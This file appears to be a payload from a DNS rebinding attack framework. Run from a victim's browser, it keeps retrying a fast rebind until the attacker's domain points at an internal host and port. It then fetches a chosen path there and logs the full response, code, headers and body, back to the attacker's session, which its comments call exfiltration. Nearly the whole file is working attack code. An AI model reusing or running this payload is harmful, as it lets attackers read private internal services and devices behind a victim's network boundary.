// This is an implementation of the `fetch-page.js` payload using the
// framework's fastRebind capability.
// the fastRebind mode serves two A records (the original remote and the rebind
// target) and uses iptables rules to block the original remote after the
// payload has been loaded. On Chromium this will trigger a faster rebind,
// bypassing the need to wait for the DNS cache timeout.

import * as network from '../libs/network'
import Session from '../libs/session'

const session = new Session()

async function mainFrame () {
  // keep track of the timeout ID for the last attempt
  // we use this to stop calling attemptRebind once
  // we have a successful rebind
  let attemptId

  // testing iframe communication
  function receiveMessage (event) {
    // should check the origin of the message here
    console.log(event.data)
  }
  window.addEventListener('message', receiveMessage, false)
  // end testing iframe communication

  // keep trying fast DNS rebinding until it works
  const attemptRebind = (time) => {
    session.createRebindFrame(window.args.host, window.args.port, {
      // enable fastRebind
      fastRebind: true,
      args: {
        path: window.args.path
      }
    })
    window.setTimeout(() => {
      attemptId = attemptRebind(1000)
    }, time)
  }
  attemptRebind(1000)
}

function rebindFrame () {
  // testing iframe communication
  window.parent.postMessage('ack', '*')
  // end testing iframe communication

  session.triggerRebind().then(() => {
    network.get(session.baseURL + window.args.path, {
      successCb: (code, headers, body) => {
        // success callback
        session.log({ code: code, headers: headers, body: body })
        session.done()
      },
      failCb: (code, headers, body) => {
        // fail callback
        // (we still want to exfiltrate the response even if it's i.e. a 404)
        session.log({ code: code, headers: headers, body: body })
        session.done()
      }
    })
  })
}

if (window.args && window.args._rebind) rebindFrame()
else mainFrame()
